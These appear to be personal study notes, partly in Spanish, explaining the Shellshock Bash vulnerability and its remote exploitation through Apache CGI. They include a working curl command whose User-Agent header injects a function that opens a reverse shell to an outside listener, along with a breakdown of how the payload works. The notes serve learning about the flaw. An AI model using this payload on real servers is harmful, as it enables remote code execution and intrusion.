- todas las versiones de Bash anteriores a la 4.3 (bash --version)
- explotable nivel local y en remoto
- permite RCE, por lo que afecta a la confidencialidad, la integridad y a la disponibilidad- basado en explotar las variables de entorno [[Los sistemas operativos basados Linux#Variables]]
- ![[Pasted image 20231230121345.png]]
### Apache CLI, aprovechar esta vulnerabilidad en remoto![[Pasted image 20231230123305.png]]

### Breakdown of Shellshock for CGIReference:
https://www.sevenlayers.com/index.php/125-exploiting-shellshock```bash**curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.90.35/9999 0>&1' http://192.168.90.59/cgi-bin/test.sh**```
- in general we are curling the cgi-bin/test.sh of our vulnerable Apache Server using CGI
### Header payload 
- in this case we use the Header field of User-Agent, which ist then stored in a global variable from the CGI(Common Gateaway interface) 
- if the CGI is now referencing the User-Agent again, our defined function is called
### Function set-up
- first we use a nop-function () {:;}, just to make sure that bash can execute the function successfully and then we add our commands to execute